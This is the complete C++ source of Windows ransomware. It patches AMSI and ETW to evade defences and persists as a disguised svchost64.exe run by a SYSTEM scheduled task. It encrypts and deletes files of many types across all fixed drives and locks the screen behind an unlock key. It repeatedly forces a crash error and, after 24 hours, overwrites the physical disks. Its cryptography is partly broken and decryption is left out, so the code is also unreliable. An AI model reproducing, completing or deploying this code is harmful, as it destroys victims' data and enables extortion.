#include <windows.h>
#include <gdiplus.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
using namespace std;
using namespace Gdiplus;

constexpr const char* CONTACT = "cotroneosalvador@gmail.com";
constexpr const char* KEY     = "himself9864";
constexpr DWORD TIMEOUT_MS    = 24 * 3600 * 1000;

// --- AMSI + ETW bypass ---
void bypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        DWORD old;
        VirtualProtect((BYTE*)hAmsi + 0x1B5C0, 4, PAGE_EXECUTE_READWRITE, &old);
        *(BYTE*)((BYTE*)hAmsi + 0x1B5C0) = 0xC3;  // ret
    }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        DWORD old;
        VirtualProtect((BYTE*)hNtdll + 0xF4C0, 1, PAGE_EXECUTE_READWRITE, &old);
        *(BYTE*)((BYTE*)hNtdll + 0xF4C0) = 0xC3;  // ret
    }
}

// --- Disable shutdown ---
void block_shutdown() {
    HANDLE hTok;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hTok);
    TOKEN_PRIVILEGES tp = { 1, { { { 0, 0 }, SE_PRIVILEGE_ENABLED } } };
    LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    while (1) {
        typedef NTSTATUS (WINAPI *pNtRaiseHardError)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG);
        pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
        ULONG resp;
        NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &resp);
        Sleep(1000);
    }
}

// --- AES-256-CBC ---
void aes_encrypt(const BYTE* in, BYTE* out, size_t len, const BYTE* iv) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenKey(hProv, CALG_AES_256, 0, &hKey);
    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    CryptImportKey(hProv, KEY, 32, 0, 0, &hKey);
    memcpy(out, iv, 16);
    CryptEncrypt(hKey, 0, TRUE, 0, out + 16, (DWORD*)&len, len + 16);
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
}

// --- Encrypt file ---
void encrypt_file(const wstring& path) {
    BYTE iv[16];
    CryptGenRandom(GetProcessHeap(), 16, iv);
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD sz = GetFileSize(hFile, NULL);
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz + 32);
    DWORD rd;
    ReadFile(hFile, buf, sz, &rd, NULL);
    CloseHandle(hFile);
    aes_encrypt(buf, buf, sz, iv);
    wstring out = path + L".locked";
    HANDLE hOut = CreateFileW(out.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    DWORD wr;
    WriteFile(hOut, buf, sz + 16, &wr, NULL);
    CloseHandle(hOut);
    DeleteFileW(path.c_str());
    HeapFree(GetProcessHeap(), 0, buf);
}

// --- Walk drives ---
void walk(const wstring& top) {
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((top + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        wstring full = top + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (wcscmp(fd.cFileName, L".") && wcscmp(fd.cFileName, L".."))
                walk(full);
        } else {
            wstring ext = fd.cFileName;
            size_t dot = ext.rfind(L'.');
            if (dot != wstring::npos) {
                ext = ext.substr(dot);
                const wchar_t* exts[] = { L".doc",L".docx",L".xls",L".xlsx",L".pdf",L".txt",L".png",L".jpg",L".zip",L".rar",L".7z",L".cpp",L".h",L".c",L".py",L".js",L".ps1",L".sln",L".db",L".bak",L".mp4",L".mp3",L".wav",L".flac",L".mkv",L".csv",L".rtf",L".sql",L".sqlite",L".pst",L".ost",L".dwg",L".dxf",L".max",L".3ds",L".blend",L".fbx",L".obj",L".log",L".tmp",L".cfg",L".xml",L".json",L".yaml",L".yml",L".toml",L".env",L".properties",L".gradle",L".cmake",L".mk",L".make",L".ninja",L".bazel",L".buck",L".gn",NULL };
                for (const wchar_t** p = exts; *p; ++p)
                    if (!_wcsicmp(ext.c_str(), *p)) {
                        encrypt_file(full);
                        break;
                    }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

// --- Encrypt drives ---
void encrypt_drives() {
    for (wchar_t d = L'C'; d <= L'Z'; ++d) {
        wstring root = wstring(1, d) + L":\\";
        if (GetDriveTypeW(root.c_str()) == DRIVE_FIXED)
            thread(walk, root).detach();
    }
}

// --- Wipe after timer ---
void wipe() {
    for (int i = 0; i < 16; ++i) {
        wstring phys = L"\\\\.\\PhysicalDrive" + to_wstring(i);
        HANDLE h = CreateFileW(phys.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            BYTE buf[1024 * 1024] = { 0 };
            DWORD wr;
            WriteFile(h, buf, sizeof(buf), &wr, NULL);
            CloseHandle(h);
        }
    }
    system("taskkill /f /im wininit.exe");
}

// --- Window proc ---
LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEdit;
    switch (msg) {
    case WM_CREATE:
        hEdit = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER, 200, 400, 400, 30, hWnd, NULL, NULL, NULL);
        CreateWindowA("BUTTON", "UNLOCK", WS_CHILD | WS_VISIBLE, 300, 450, 200, 30, hWnd, (HMENU)1, NULL, NULL);
        return 0;
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) {
            char buf[64];
            GetWindowTextA(hEdit, buf, sizeof(buf));
            if (!strcmp(buf, KEY)) {
                // Decrypt here (omitted for brevity)
                ExitProcess(0);
            }
        }
        return 0;
    case WM_CLOSE: return 0;
    }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

// --- GUI ---
void gui() {
    ULONG tok;
    GdiplusStartupInput gsi;
    GdiplusStartup(&tok, &gsi, NULL);
    WNDCLASSEXA wc = { sizeof(wc), 0, WndProc, 0, 0, GetModuleHandleA(NULL), NULL, NULL, (HBRUSH)GetStockObject(BLACK_BRUSH), NULL, "CLS", NULL };
    RegisterClassExA(&wc);
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HWND hWnd = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, "CLS", NULL, WS_POPUP, 0, 0, w, h, NULL, NULL, NULL, NULL);
    ShowWindow(hWnd, SW_SHOW);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    GdiplusShutdown(tok);
}

// --- Persistence ---
void persist() {
    char self[MAX_PATH], dst[MAX_PATH];
    GetModuleFileNameA(NULL, self, sizeof(self));
    ExpandEnvironmentStringsA("%PROGRAMDATA%\\svchost64.exe", dst, sizeof(dst));
    if (_stricmp(self, dst)) {
        CopyFileA(self, dst, FALSE);
        SetFileAttributesA(dst, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        ShellExecuteA(NULL, "runas", "schtasks", "/create /tn \"WinSvc\" /tr \"%PROGRAMDATA%\\svchost64.exe\" /sc onstart /ru SYSTEM /f", NULL, SW_HIDE);
    }
}

// --- Main ---
int main() {
    bypass();
    persist();
    thread(block_shutdown).detach();
    thread(encrypt_drives).detach();
    thread([] { this_thread::sleep_for(chrono::milliseconds(TIMEOUT_MS)); wipe(); }).detach();
    gui();
    return 0;
}